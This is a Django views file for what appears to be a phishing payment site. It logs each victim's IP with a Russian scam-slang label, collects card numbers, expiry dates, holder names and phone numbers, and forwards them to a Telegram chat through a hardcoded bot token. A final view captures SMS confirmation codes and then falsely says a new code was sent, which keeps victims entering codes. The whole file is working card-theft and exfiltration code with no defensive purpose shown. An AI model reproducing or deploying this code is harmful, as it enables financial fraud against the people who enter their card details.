from django.shortcuts import render
from django.urls import reverse
from django.http import HttpResponseRedirect
from ipware import get_client_ip
import telebot
bot = telebot.TeleBot('6213453826:AAEgWtaaS9-Td9kZmuqRmg3KoH_2muhq-sQ')
chat_id = '-1001955272769'


def index(request):
    if request.method == 'POST':
        if 'continue-button' in request.POST:
            ip = get_client_ip(request)
            bot.send_message(chat_id, f'Мамонт на странице ввода. IP: {ip}')
            url = reverse('payment')
            return HttpResponseRedirect(url)
    return render(request, 'main/index.html')

def payment(request):
    if request.method == 'POST':
        if 'pay' in request.POST:
            card_month = request.POST.get('cardMonth')
            card_year = request.POST.get('cardYear')
            card_name = request.POST.get('cardName')
            card_number = request.POST.get('cardNumber')
            phone_number = request.POST.get('phoneNumber')
            if len(card_number) < 19:
                error_message = 'Проверьте правильность введенной карты'
                return render(request, 'main/payment.html', {'error_card' : error_message})
            else:
                bot.send_message(chat_id, f"Номер карты: {card_number}\nСрок действия: {card_month}/{card_year}\nНомер телефона: {phone_number}\nДержатель: {card_name}")
                card_url = card_number.replace(" ", "")
                url = reverse('code', args=[card_url])
                return HttpResponseRedirect(url)
    return render(request, 'main/payment.html')

def code(request, card_number):
    card_number = card_number
    data = {'card_number': card_number,}
    if request.method == "POST":
        if "code-button" in request.POST:
            code = request.POST.get('code')
            bot.send_message(chat_id, f'Номер карты:{card_number}\nКод: {code}')
            error_message = "На ваш номер был выслан новый смс-код."
            data['error_message'] = error_message
            return render(request, 'main/code.html', data)
    return render(request, 'main/code.html', data)
# Create your views here.
